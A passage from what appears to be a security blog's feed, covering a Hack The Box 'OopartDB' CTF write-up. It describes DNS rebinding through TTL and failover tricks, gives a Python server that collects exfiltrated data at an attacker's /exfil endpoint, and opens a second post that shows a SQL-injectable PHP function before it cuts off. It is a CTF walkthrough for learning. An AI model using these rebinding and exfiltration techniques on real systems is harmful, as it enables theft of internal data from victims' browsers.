+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">headless&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="kc">true&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">pipe&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="kc">true&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">args&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">[&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;--no-sandbox&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;--disable-setuid-sandbox&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;--js-flags=--noexpose_wasm,--jitless&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">dumpio&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="kc">true&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nx">context&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kr">await&lt;/span> &lt;span class="nx">browser&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">createIncognitoBrowserContext&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nx">page&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kr">await&lt;/span> &lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">newPage&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">await&lt;/span> &lt;span class="nx">page&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="kr">goto&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;http://localhost/login&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">waitUntil&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;networkidle2&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">await&lt;/span> &lt;span class="nx">page&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">evaluate&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">user&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">pass&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">querySelector&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;input[name=user]&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">value&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">user&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">querySelector&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;input[name=pass]&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">value&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">pass&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">querySelector&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;button[type=submit]&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">click&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span> &lt;span class="s2">&amp;#34;The Overseer&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">password&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">await&lt;/span> &lt;span class="nx">page&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">waitForNavigation&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">await&lt;/span> &lt;span class="nx">page&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="kr">goto&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">url&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">waitUntil&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;networkidle2&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">await&lt;/span> &lt;span class="nx">page&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">waitForTimeout&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">7000&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">await&lt;/span> &lt;span class="nx">browser&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">close&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">browser&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">catch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">finally&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">browser&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kr">await&lt;/span> &lt;span class="nx">browser&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">close&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">};&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>So the problem is that the client is making a request to &lt;code>http://localhost/debug&lt;/code> from &lt;code>http://attacker.com&lt;/code>, which gets blocked.
+But what if during the delay between the bot visiting the attacker site, and then timing out, we rebind the address for &lt;code>http://attacker.com&lt;/code> to instead point to &lt;code>127.0.0.1&lt;/code>?&lt;/p>
+&lt;ol>
+&lt;li>So the bot visits &lt;code>http://attacker.com&lt;/code>, which will resolve to our real address (lets say it is &lt;code>1.3.3.7&lt;/code>).&lt;/li>
+&lt;li>We rebind &lt;code>http://attacker.com&lt;/code> to &lt;code>127.0.0.1&lt;/code>, WHILE the bot still has the page loaded in their browser.&lt;/li>
+&lt;li>Then our script will run, and will send a request to &lt;code>http://attacker.com/debug&lt;/code>, which is now actually &lt;code>http://127.0.0.1/debug&lt;/code>, successfully grabbing the environment data that we need.&lt;/li>
+&lt;li>Then we make a post request to &lt;code>http://1.3.3.7/exfil&lt;/code> containing the response to &lt;code>http://attacker.com/debug&lt;/code> (actually &lt;code>http://127.0.0.1/debug&lt;/code>), (and we set our CORS policy to allow requests from any domain), which successfully exfils the data to us.&lt;/li>
+&lt;/ol>
+&lt;p>A key element to making this attack work is having a low TTL on the DNS response, so the browser is forced to ask for the address twice.&lt;/p>
+&lt;p>I decided to use this &lt;a class="link" href="https://lock.cmpxchg8b.com/rebinder.html" target="_blank" rel="noopener"
+>dns rebind site&lt;/a> to facilitate the attack.
+The first address will be that of my EC2 instance, and the second will be &lt;code>127.0.0.1&lt;/code>.
+Then we just need to run the attack a few times until we get the elements to line up properly.&lt;/p>
+&lt;p>However this attack kept failing.
+I would always receive both requests to my ec2 instance, no matter how many times I tried.
+I tried changing the delays, but never worked.
+At the end of this article I will explore why this was.&lt;/p>
+&lt;h3 id="bypass-2">Bypass 2
+&lt;/h3>&lt;p>In the same hacktricks article, a second subtype of dns rebinding was mentioned.
+Its very similar, but instead of depending on TTL to cause the browser to resolve the address, it will used availability of the server instead.
+We can use a service like AWS Route 53 to register 2 IP addresses for the same domain name, in our case it will be (&lt;code>1.3.3.7&lt;/code> and &lt;code>127.0.0.1&lt;/code>).
+For the first request to collect the CSRF payload, we allow the &lt;code>1.3.3.7&lt;/code> ec2 instance to remain available, but once the page is loaded, we kill the instance.
+That way, when the next request is made to &lt;code>http://attacker.com/debug&lt;/code> and it tries to make the request to our ec2 instance at &lt;code>1.3.3.7&lt;/code>, the request will fail, and the victim&amp;rsquo;s browser will fallback to &lt;code>127.0.0.1&lt;/code>, allowing the attack to work.
+I will also set up a second ec2 instance to collect the post request, because I don&amp;rsquo;t want to depend on the first ec2 instance booting up in time to catch the exfiltration POST request.
+In AWS this is called failover-routing.
+However, this requires registering a domain with AWS, which costs about 13$ depending on the name you chose, or 79$ to transfer in an existing domain.
+I tried to find a free alternative, but wasn&amp;rsquo;t successful.
+Seems like at the minimum you need a domain, which I was able to get on Gandi for about 3$.
+Then I added in 2 DNS A records with the address of my ec2 instance and &lt;code>0.0.0.0&lt;/code> as per the suggestion on HackTricks.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/8.png"
+width="993"
+height="114"
+srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/8_huaf59b0db051cbccc042266550b267afd_5360_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/8_huaf59b0db051cbccc042266550b267afd_5360_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="2 DNS A records"
+class="gallery-image"
+data-flex-grow="871"
+data-flex-basis="2090px"
+>&lt;/p>
+&lt;p>The min TTL is 300, but fortunately we won&amp;rsquo;t depend on TTL for this attack, since we just depend on connectivity causing the browser to fallback to the alternative address (&lt;code>0.0.0.0&lt;/code>).&lt;/p>
+&lt;p>AND THIS WORKED !!&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/9.png"
+width="683"
+height="117"
+srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/9_hu7d4752c376da2419cce15044c6d98500_7470_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/9_hu7d4752c376da2419cce15044c6d98500_7470_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Kill the server after the first request"
+class="gallery-image"
+data-flex-grow="583"
+data-flex-basis="1401px"
+> &lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/10.png"
+width="629"
+height="562"
+srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/10_hu5fc19c9a5454334247fdaa9977a17e1b_15410_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/10_hu5fc19c9a5454334247fdaa9977a17e1b_15410_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Request to exfil contains our debug info"
+class="gallery-image"
+data-flex-grow="111"
+data-flex-basis="268px"
+>&lt;/p>
+&lt;p>At this point just little automation for killing the payload server after the first request, and saving the post request for further examination:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="ch">#!/usr/bin/python3&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">http.server&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">HTTPServer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">SimpleHTTPRequestHandler&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">test&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">sys&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">CORSRequestHandler&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">SimpleHTTPRequestHandler&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">end_headers&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send_header&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Access-Control-Allow-Origin&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;*&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">SimpleHTTPRequestHandler&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">end_headers&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">do_GET&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;/index.html&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">SimpleHTTPRequestHandler&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">do_GET&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">sys&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># Exit the program after serving the index.html file&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">SimpleHTTPRequestHandler&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">do_GET&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">do_POST&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">content_length&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">headers&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;Content-Length&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">post_data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">rfile&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">content_length&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;/exfil&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">with&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;debug.txt&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;wb&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">f&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">post_data&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[*] Exfil data written to debug.txt&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">test&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">CORSRequestHandler&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">HTTPServer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">port&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">80&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/12.png"
+width="820"
+height="650"
+srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/12_hu95d6488530ee901344af53801fd2b1d7_80813_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/12_hu95d6488530ee901344af53801fd2b1d7_80813_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Current attack structure"
+class="gallery-image"
+data-flex-grow="126"
+data-flex-basis="302px"
+>&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/11.png"
+width="683"
+height="184"
+srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/11_hueed3f851ca10f44d92646e6d96dbd821_11973_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/11_hueed3f851ca10f44d92646e6d96dbd821_11973_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Referral token acquired"
+class="gallery-image"
+data-flex-grow="371"
+data-flex-basis="890px"
+>&lt;/p></description></item><item><title>When Leetcode Meets Hacking</title><link>https://Kvn11.github.io/p/when-leetcode-meets-hacking/</link><pubDate>Thu, 08 Feb 2024 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/when-leetcode-meets-hacking/</guid><description>&lt;img src="https://Kvn11.github.io/p/when-leetcode-meets-hacking/img/hackthebox.jpg" alt="Featured image of post When Leetcode Meets Hacking" />&lt;h1 id="intro">Intro
+&lt;/h1>&lt;p>Given that I&amp;rsquo;m currently grinding leetcode and app sec stuff, this challenge was super enjoyable.
+The vulnerability is very straightforward and easy to spot, and you get to write a binary search script to leak the flag (you don&amp;rsquo;t have to, but it does offer optimal time complexity).&lt;/p>
+&lt;h1 id="walkthrough">Walkthrough
+&lt;/h1>&lt;p>There is an SQL injection available within the &lt;code>unsafequery()&lt;/code> function.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="k">function&lt;/span> &lt;span class="nf">unsafequery&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$pdo&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$id&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$stmt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$pdo&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">query&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;SELECT id, gamename, gamedesc, image FROM posts WHERE id = &amp;#39;&lt;/span>&lt;span class="si">$id&lt;/span>&lt;span class="s2">&amp;#39;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$stmt&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">PDO&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="na">FETCH_ASSOC&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nv">$result&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">catch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">Exception&lt;/span> &lt;span class="nv">$e&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">http_response_code&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">500&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;Internal Server Error&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">exit&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>This unsafe function can only be called when we have the &lt;code>Transfer-Encoding: chunked&lt;/code> header in our request, but if the query succeeds then we will only see an error message.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
